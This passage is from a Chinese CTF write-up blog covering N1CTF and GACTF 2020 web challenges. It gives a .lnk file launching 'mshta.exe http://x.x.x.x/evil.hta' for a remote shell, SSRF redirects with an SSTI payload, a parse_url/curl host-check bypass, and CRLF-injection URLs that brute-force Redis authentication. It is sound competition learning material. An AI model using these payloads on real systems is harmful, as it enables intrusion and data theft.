alt="mark"></p><p>获取到key为n1ctf20205bf75ab0a30dfc0c</p><p>之后就是通过反序列化构造poc获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $check;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;check=<span class="string">"n1ctf20205bf75ab0a30dfc0c"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> flag());</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">4</span>:<span class="string">"flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"check"</span>;s:<span class="number">25</span>:<span class="string">"n1ctf20205bf75ab0a30dfc0c"</span>;&#125;</div></pre></td></tr></table></figure><p>成功获取flag</p><p><img src="http://pic.c1imber.top/blog/20201019/0zSO8n89joWU.png?imageslim" alt="mark"></p><p><code>n1ctf{you_g0t_1t_hack_for_fun}</code></p><h3 id="The-King-Of-Phish-Victim-Bot"><a href="#The-King-Of-Phish-Victim-Bot" class="headerlink" title="The King Of Phish (Victim Bot)"></a>The King Of Phish (Victim Bot)</h3><p>python代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Victim bot</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> LnkParse3 <span class="keyword">as</span> Lnk</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request    </div><div class="line"></div><div class="line">app = Flask(__name__)   </div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    source = open(__file__, <span class="string">'r'</span>).read().replace(<span class="string">"\n"</span>, <span class="string">"\x3c\x62\x72\x3e"</span>).replace(<span class="string">" "</span>, <span class="string">"\x26\x6e\x62\x73\x70\x3b"</span>)</div><div class="line">    <span class="keyword">return</span> source   </div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/send', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendFile</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</div><div class="line">        <span class="keyword">return</span> <span class="string">'No file part'</span></div><div class="line">    file = request.files[<span class="string">'file'</span>]    </div><div class="line"></div><div class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'No selected file'</span></div><div class="line">    data = file.stream.read()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b"\x4c\x00"</span>):</div><div class="line">        <span class="keyword">return</span> <span class="string">"You're a bad guy!"</span></div><div class="line">    shortcut = Lnk.lnk_file(indata=data)</div><div class="line">    <span class="keyword">if</span> shortcut.data[<span class="string">'command_line_arguments'</span>].count(<span class="string">" "</span>):</div><div class="line">        <span class="keyword">return</span> <span class="string">"File is killed by antivirus."</span></div><div class="line">    filename = str(uuid.uuid4())+<span class="string">".lnk"</span></div><div class="line">    fullname = os.path.join(os.path.abspath(os.curdir) + <span class="string">"/uploads"</span>, filename)</div><div class="line">    open(fullname, <span class="string">"wb"</span>).write(data)</div><div class="line">    clickLnk(fullname)</div><div class="line">    <span class="keyword">return</span> <span class="string">"Clicked."</span>   </div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clickLnk</span><span class="params">(lnkPath)</span>:</span></div><div class="line">    subprocess.run(<span class="string">'cmd /c "%s"'</span> % lnkPath, capture_output=<span class="keyword">True</span>, shell=<span class="keyword">True</span>, check=<span class="keyword">True</span>)    </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>阅读代码，看样子是需要上传lnk文件，然后执行文件getshell，但是不能有空格</p><p><a href="https://pypi.org/project/LnkParse3/" title="LnkParse3" target="_blank" rel="external">LnkParse3库</a></p><p><img src="http://pic.c1imber.top/blog/20201019/KyqOV7gofEVV.png?imageslim" alt="mark"></p><p>最终找到可以上线的方法，通过mshta上线</p><p><img src="http://pic.c1imber.top/blog/20201019/Hhpafp83VpVa.png?imageslim" alt="mark"></p><p>制作test.lnk</p><p><code>C:\Windows\System32\mshta.exe http://x.x.x.x/evil.hta</code></p><p><img src="http://pic.c1imber.top/blog/20201020/IMV8jylbxOTO.png?imageslim" alt="mark"></p><p>测试无空格</p><p><img src="http://pic.c1imber.top/blog/20201019/lX5suqqRMghM.png?imageslim" alt="mark"></p><p>上传test.lnk，上线成功</p><p><img src="http://pic.c1imber.top/blog/20201019/VYXmO3FAq1H8.png?imageslim" alt="mark"></p><p>根据题目提示，最终在<code>C:\Users\UserA\Desktop\flag.txt</code>当中获取到了flag</p><p><img src="http://pic.c1imber.top/blog/20201019/7KDXlnagc5S7.png?imageslim" alt="mark"></p><p><code>n1ctf{I&#39;m_a_little_fish,_swimming_in_the_ocean}</code></p><p>在<code>C:\Users\UserA\Desktop\</code>目录下还看到了CVE-2020-1472目录，但是这个不影响获取flag，应该和后面的The King Of Phish (UserA-PC)或者The King Of Phish (DC)有关</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;队伍ID：GUTS，web狗个人参赛&lt;/p&gt;
&lt;p&gt;做出的题目&lt;br&gt;&lt;img src=&quot;http://pic.c1imber.top/blog/20201019/96npVIgBXvdn.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;web
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020GACTF writeup</title>
    <link href="https://c1aysec.github.io/2020/08/31/2020GACTF%20writeup/"/>
    <id>https://c1aysec.github.io/2020/08/31/2020GACTF writeup/</id>
    <published>2020-08-31T09:59:34.527Z</published>
    <updated>2020-09-02T16:15:25.667Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h3><p><a href="http://124.70.206.91:10001/" target="_blank" rel="external">http://124.70.206.91:10001/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/f0TCWlvCasHb.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/ctfhint')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ctf</span><span class="params">()</span>:</span></div><div class="line">    hint =xxxx <span class="comment"># hints</span></div><div class="line">    trick = xxxx <span class="comment"># trick</span></div><div class="line">    <span class="keyword">return</span> trick</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># app.txt</span></div><div class="line"><span class="meta">@app.route('/eval', methods=["POST"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_eval</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># post eval</span></div><div class="line"><span class="meta">@app.route(xxxxxx, methods=["POST"]) # Secret</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># admin requests</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</div></pre></td></tr></table></figure><p>通过代码提示，POST请求/eval路由，得到提示：post eval</p><p><img src="http://pic.c1imber.top/blog/20200831/Duo06XLNNY7S.png?imageslim" alt="mark"></p><p>后端大概是类似于<code>eval(&quot;post eval&quot;)</code>这种，但是过滤了很多内容，过滤的字符有<code>(、）、[、、]、&quot;、&#39;</code>等，并且有长度限制</p><p>可以通过传入eval=ctf.func_code.co_consts获取隐藏路由和提示信息</p><p><img src="http://pic.c1imber.top/blog/20200831/uhLQUt9D3pSI.png?imageslim" alt="mark"></p><p>(None, ‘the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->‘, ‘too young too simple’)</p><p><a href="https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html" target="_blank" rel="external">https://www.cnblogs.com/xgxzj/archive/2011/09/15/2176240.html</a></p><p>POST请求h4rdt0f1nd_9792uagcaca00qjaf路由</p><p><img src="http://pic.c1imber.top/blog/20200831/HRJiDEFiUVuJ.png?imageslim" alt="mark"></p><p>获得提示，需要传入post ip=x.x.x.x&amp;port=xxxx&amp;path=xxx =&gt; <a href="http://ip:port/path" target="_blank" rel="external">http://ip:port/path</a></p><p>这里存在ssrf，ip参数限制了只能为点分十进制ip地址格式且限制了不能为内网ip，path当中不能出现数字，但是这里用的是python的requests库，默认是支持302跳转</p><p>vps 302跳转php脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>请求ip=vps&amp;port=&amp;path=/aaa.php，获取源码提示</p><p><img src="http://pic.c1imber.top/blog/20200831/vGLlt0bg3rXy.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> flask</div><div class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</div><div class="line">app = flask.Flask(__name__)</div><div class="line">app.config[<span class="string">'FLAG'</span>] = flag</div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> open(<span class="string">'app.txt'</span>).read()</div><div class="line"><span class="meta">@app.route('/&lt;path:hack&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hack)</span>:</span></div><div class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">5000</span>)</div></pre></td></tr></table></figure><p>存在ssti，获取flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(<span class="string">"Location: http://127.0.0.1:5000/&#123;&#123;config['FLAG']&#125;&#125;"</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/IBBVu7wFL8QD.png?imageslim" alt="mark"></p><h3 id="sssrfme"><a href="#sssrfme" class="headerlink" title="sssrfme"></a>sssrfme</h3><p><a href="http://121.36.199.21:10801/" target="_blank" rel="external">http://121.36.199.21:10801/</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// ini_set("display_errors", "On");</span></div><div class="line"><span class="comment">// error_reporting(E_ALL | E_STRICT);</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_url</span><span class="params">($url,$safe)</span> </span>&#123;</div><div class="line">    $parsed = parse_url($url);</div><div class="line">    $validate_ip = <span class="keyword">true</span>;</div><div class="line">    <span class="keyword">if</span>($parsed[<span class="string">'port'</span>]  &amp;&amp; !in_array($parsed[<span class="string">'port'</span>],<span class="keyword">array</span>(<span class="string">'80'</span>,<span class="string">'443'</span>)))&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        preg_match(<span class="string">'/^\d+$/'</span>, $parsed[<span class="string">'host'</span>]) &amp;&amp; $parsed[<span class="string">'host'</span>] = long2ip($parsed[<span class="string">'host'</span>]);</div><div class="line">        $long = ip2long($parsed[<span class="string">'host'</span>]);</div><div class="line">        <span class="keyword">if</span>($long===<span class="keyword">false</span>)&#123;</div><div class="line">            $ip = <span class="keyword">null</span>;</div><div class="line">            <span class="keyword">if</span>($safe)&#123;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1'</span>);</div><div class="line">                $ip   = gethostbyname($parsed[<span class="string">'host'</span>]);</div><div class="line">                $long = ip2long($ip);</div><div class="line">                $long===<span class="keyword">false</span> &amp;&amp; $ip = <span class="keyword">null</span>;</div><div class="line">                @putenv(<span class="string">'RES_OPTIONS'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $ip = $parsed[<span class="string">'host'</span>];</div><div class="line">        &#125;</div><div class="line">        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);<span class="comment">//ip为公网ip返回其ip地址，ip为保留地址或者私有地址时返回false</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!in_array($parsed[<span class="string">'scheme'</span>],<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)) || !$validate_ip)&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&#123;$url&#125; 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;"</span>.PHP_EOL;</div><div class="line">        </div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $url;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $safe = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">if</span>(safe_url($url,$safe)) &#123;</div><div class="line">        $ch = curl_init();</div><div class="line">        curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</div><div class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</div><div class="line">        $co = curl_exec($ch);</div><div class="line">        curl_close($ch);</div><div class="line">        <span class="keyword">echo</span> $co;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">curl($_GET[<span class="string">'url'</span>]);</div></pre></td></tr></table></figure><p>使用<code>parse_url</code>对传入的<code>$_GET[&#39;url&#39;]</code>进行解析，对返回的$parsed进行了检测，通过代码可以看到需要突破的限制如下：</p><p>1、<code>$parsed[&#39;port&#39;]</code>必须为80或443</p><p>2、<code>$parsed[&#39;scheme&#39;]</code>必须为http或https</p><p>3、<code>$parsed[&#39;host&#39;]</code>必须为公网ip</p><p>上面的限制可以通过<code>parse_url</code>和curl的解析差异绕过</p><p>解析差异：</p><p>对于url格式</p><p><code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></p><p>当url当中存在@时</p><p><code>parse_url</code>在解析url时,取的host和port为最后一个@字符后符合格式的host和port</p><p>curl在解析url时，取的host和port为第一个@字符后符合格式的host和port</p><p>举个栗子:</p><p>当请求地址<a href="http://u:p@127.0.0.1:1234" target="_blank" rel="external">http://u:p@127.0.0.1:1234</a> @1.1.1.1:80(<strong>注意这里中间位置有一个空格，空格也可以被其它字符代替，可以通过Fuzz获取允许的字符，有的curl版本不需要这个空格</strong>)</p><p>demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url=<span class="string">"http://u:p@127.0.0.1:1234 @1.1.1.1:80"</span>;</div><div class="line">$parsed = parse_url($url);</div><div class="line">var_dump($parsed);</div><div class="line">var_dump(ip2long($parsed[<span class="string">'host'</span>]));</div><div class="line">var_dump(filter_var($parsed[<span class="string">'host'</span>], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE));</div></pre></td></tr></table></figure><p>parse_url的解析结果如下，这里解析到的host和port为1.1.1.1和80</p><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123; [<span class="string">"scheme"</span>]=&gt; string(<span class="number">4</span>) <span class="string">"http"</span> [<span class="string">"host"</span>]=&gt; string(<span class="number">7</span>) <span class="string">"1.1.1.1"</span> [<span class="string">"port"</span>]=&gt; int(<span class="number">80</span>) [<span class="string">"user"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"u"</span> [<span class="string">"pass"</span>]=&gt; string(<span class="number">17</span>) <span class="string">"p@127.0.0.1:1234 "</span> &#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200831/9JAiUla8pUHy.png?imageslim" alt="mark"></p><p>而curl解析的host和port为127.0.0.1和1234，并且可以看到在curl请求时，空格+@1.1.1.1:80内容被丢弃</p><p><img src="http://pic.c1imber.top/blog/20200831/OoUbbmO5YbeC.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20200831/nSrfYQFFGYOF.png?imageslim" alt="mark"></p><p>通过这个特性可以绕过对host和port的限制</p><p>所以目标可以通过以下的请求绕过对ip和端口的限制，对内网ip端口进行探测（题目这里的@1.1.1.1前不需要空格就可以）</p><p><a href="http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/" target="_blank" rel="external">http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:80@1.1.1.1/</a></p><p><img src="http://pic.c1imber.top/blog/20200831/EbeVoLQEgGgr.png?imageslim" alt="mark"></p><p>（可以看到这里返回了<a href="http://127.0.0.1:80的页面内容）" target="_blank" rel="external">http://127.0.0.1:80的页面内容）</a></p><p>fuzz一下其它可用字符</p><p><img src="http://pic.c1imber.top/blog/20200831/Esh2Nk9AzIf4.png?imageslim" alt="mark"></p><p>得到可用字符有很多</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line">%a0</div><div class="line">%b0</div><div class="line">%c0</div><div class="line">%d0</div><div class="line">%e0</div><div class="line">%f0</div><div class="line">%a1</div><div class="line">%b1</div><div class="line">%c1</div><div class="line">%d1</div><div class="line">%e1</div><div class="line">%f1</div><div class="line">%a2</div><div class="line">%b2</div><div class="line">%c2</div><div class="line">%d2</div><div class="line">%e2</div><div class="line">%f2</div><div class="line">%a3</div><div class="line">%b3</div><div class="line">%c3</div><div class="line">%d3</div><div class="line">%e3</div><div class="line">%f3</div><div class="line">%a4</div><div class="line">%b4</div><div class="line">%c4</div><div class="line">%d4</div><div class="line">%e4</div><div class="line">%f4</div><div class="line">%a5</div><div class="line">%b5</div><div class="line">%c5</div><div class="line">%d5</div><div class="line">%e5</div><div class="line">%f5</div><div class="line">%a6</div><div class="line">%b6</div><div class="line">%c6</div><div class="line">%d6</div><div class="line">%e6</div><div class="line">%f6</div><div class="line">%a7</div><div class="line">%b7</div><div class="line">%c7</div><div class="line">%d7</div><div class="line">%e7</div><div class="line">%f7</div><div class="line">%a8</div><div class="line">%b8</div><div class="line">%c8</div><div class="line">%d8</div><div class="line">%e8</div><div class="line">%f8</div><div class="line">%a9</div><div class="line">%b9</div><div class="line">%c9</div><div class="line">%d9</div><div class="line">%e9</div><div class="line">%f9</div><div class="line">%aa</div><div class="line">%ba</div><div class="line">%ca</div><div class="line">%da</div><div class="line">%ea</div><div class="line">%fa</div><div class="line">%ab</div><div class="line">%bb</div><div class="line">%cb</div><div class="line">%db</div><div class="line">%eb</div><div class="line">%fb</div><div class="line">%ac</div><div class="line">%bc</div><div class="line">%cc</div><div class="line">%dc</div><div class="line">%ec</div><div class="line">%fc</div><div class="line">%ad</div><div class="line">%bd</div><div class="line">%cd</div><div class="line">%dd</div><div class="line">%ed</div><div class="line">%fd</div><div class="line">%ae</div><div class="line">%be</div><div class="line">%ce</div><div class="line">%de</div><div class="line">%ee</div><div class="line">%fe</div><div class="line">%af</div><div class="line">%bf</div><div class="line">%cf</div><div class="line">%df</div><div class="line">%ef</div><div class="line">%ff</div></pre></td></tr></table></figure><p><strong>注明一下：不同环境下的测试结果会有差别，php有些版本的curl对于这样格式的url会请求失败，或者仅支持很少的字符</strong></p><p>接下来扫描端口，在5000端口得到了提示</p><p><img src="http://pic.c1imber.top/blog/20200831/BJrQDfU8jYs6.png?imageslim" alt="mark"></p><p>hello,world<br>hint: 这是个套娃. <a href="http://localhost:5000/?url=https://baidu.com" target="_blank" rel="external">http://localhost:5000/?url=https://baidu.com</a></p><p>通过探测得知<a href="http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https" target="_blank" rel="external">http://127.0.0.1:5000也存在ssrf，ssrf套ssrf可还行，但是经过测试后发现同样只支持http/https</a></p><p>之后通过OOB外带看到这里用的是python的urllib</p><p><img src="http://pic.c1imber.top/blog/20200831/rwinq6vrhblL.png?imageslim" alt="mark"></p><p>这里可以通过urllib的http头注入突破http/https协议的限制，对内网redis进行攻击</p><pre><code>CVE-2016-5699: http://[vps-ip]%0d%0aX-injected:%20header:8888CVE-2019-9740: http://[vps-ip]%0d%0a%0d%0aheaders:8888CVE-2019-9947: http://[vps-ip]:8888?%0d%0apayload%0d%0apadding</code></pre><p>CVE-2019-9947可以成功</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000@1.1.1.1/?url=http://47.105.186.146:8888?%250D%250Apayload%250D%250Apadding（这里注意需要二次url编码）</code></pre><p>可以看到注入成功</p><p><img src="http://pic.c1imber.top/blog/20200831/J3RUAsO6bn1P.png?imageslim" alt="mark"></p><p>redis存在密码，需要爆破，题目提示弱口令，但是却爆破不出来，均返回-NOAUTH Authentication required.</p><pre><code>http://121.36.199.21:10801/?url=http://a:b@127.0.0.1:5000%20@1.1.1.1/?url=http://127.0.0.1:6379?%250d%250a%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%25246%250D%250A123456%250D%250A%252A2%250D%250A%25244%250D%250Akeys%250D%250A%25241%250D%250A*</code></pre><p><img src="http://pic.c1imber.top/blog/20200831/C8D5XO2l5d5D.png?imageslim" alt="mark"></p><p>后来问了队里的师傅，原来因为这里的redis存在安全机制，导致不管输入什么命令都会显示-NOAUTH Authentication required.，所以需要通过redis主从rce爆破密码，反弹shell，密码为123456</p><p>用这个工具可以生成gopher协议的主从rce payload</p><p><a href="https://github.com/xmsec/redis-ssrf" target="_blank" 